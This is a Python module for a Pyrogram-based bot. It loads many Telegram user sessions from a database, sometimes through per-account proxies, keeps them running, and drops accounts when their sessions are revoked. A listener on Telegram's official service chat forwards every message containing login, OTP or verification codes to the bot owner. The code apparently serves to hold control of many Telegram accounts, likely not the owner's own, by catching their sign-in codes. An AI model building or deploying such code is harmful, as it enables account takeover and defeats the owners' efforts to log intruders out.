import asyncio
from pyrogram import Client, filters
from pyrogram.errors import Unauthorized, UserDeactivated, SessionRevoked, AuthKeyUnregistered
from config import API_ID, API_HASH, OWNER_ID
from utils.database import get_all_accounts, delete_account

active_clients = {}

async def start_user_client(phone, session_string, bot_client, proxy=None):
    try:
        user_client = Client(
            name=f"user_{phone}",
            session_string=session_string,
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True,
            proxy=proxy
        )
        
        original_handle_updates = user_client.handle_updates
        async def safe_handle_updates(*args, **kwargs):
            try:
                await original_handle_updates(*args, **kwargs)
            except (ValueError, KeyError) as e:
                if "Peer id invalid" in str(e) or "ID not found" in str(e):
                    pass
            except Exception:
                pass

        user_client.handle_updates = safe_handle_updates

        # --- AUTO-VALIDATION CHECK & START ---
        try:
            # Starting and checking if the session is still alive on Telegram's server
            await user_client.start()
            await user_client.get_me()
        except (AuthKeyUnregistered, Unauthorized, UserDeactivated, SessionRevoked) as e:
            print(f"[-] Session revoked or terminated for {phone}. Removing from DB.")
            
            # Auto-delete dead session from Database
            await delete_account(phone) 
            
            # Send alert to the Owner
            alert_msg = (
                f"⚠️ **Session Terminated!**\n\n"
                f"📱 **Account:** `{phone}`\n"
                f"ℹ️ **Reason:** This session has been logged out, revoked, or deleted from another device.\n"
                f"🗑️ The account has been safely removed from the bot's database."
            )
            try:
                await bot_client.send_message(OWNER_ID, alert_msg)
            except Exception:
                pass
                
            return False
        except Exception as e:
            # Handle other connection issues (e.g., timeout, proxy error) without deleting DB
            print(f"[-] Error connecting client {phone}: {e}")
            return False

        active_clients[phone] = user_client

        # --- SMART NOTIFICATION SYSTEM ---
        @user_client.on_message(filters.chat(777000))
        async def forward_telegram_codes(client, message):
            try:
                msg_text = (message.text or message.caption or "").lower()
                
                # Keyword filter (only forward if one of these is in the message)
                keywords = ["login", "code", "otp", "verification", "access", "sign in"]
                
                if any(key in msg_text for key in keywords):
                    alert_msg = (
                        f"🔐 **Rare Bots Hub Security Alert!**\n\n"
                        f"📱 **Account:** `{phone}`\n"
                        f"📩 **Important Telegram Message:**\n\n"
                        f"`{message.text or message.caption}`"
                    )
                    await bot_client.send_message(OWNER_ID, alert_msg)
                else:
                    print(f"[i] Ignored non-critical message from Telegram for {phone}")
                    
            except Exception as e:
                print(f"[-] Error forwarding code for {phone}: {e}")

        print(f"[+] Client Started for {phone}")
        return True
    except Exception as e:
        print(f"[-] Failed to setup client {phone}: {e}")
        return False

async def start_all_clients(bot_client):
    accounts = await get_all_accounts()
    for acc in accounts:
        await asyncio.sleep(1.5)
        await start_user_client(acc["phone"], acc["session"], bot_client, acc.get("proxy"))

async def stop_user_client(phone):
    if phone in active_clients:
        try:
            await active_clients[phone].stop()
        except Exception:
            pass
        del active_clients[phone]
        return True
    return False

# --- LIVE VALIDATION FUNCTION ---
async def verify_and_clean_account(phone, bot_client=None):
    """Checks if an active client is still valid. If not, cleans it up and notifies owner."""
    if phone in active_clients:
        try:
            await active_clients[phone].get_me()
            return True
        except (AuthKeyUnregistered, Unauthorized, UserDeactivated, SessionRevoked):
            await stop_user_client(phone)
            await delete_account(phone)
            
            if bot_client:
                alert_msg = (
                    f"⚠️ **Session Terminated!**\n\n"
                    f"📱 **Account:** `{phone}`\n"
                    f"ℹ️ **Reason:** Session was revoked during live monitoring.\n"
                    f"🗑️ The account has been safely removed from the bot's database."
                )
                try:
                    await bot_client.send_message(OWNER_ID, alert_msg)
                except Exception:
                    pass
            return False
        except Exception:
            return False
    return False
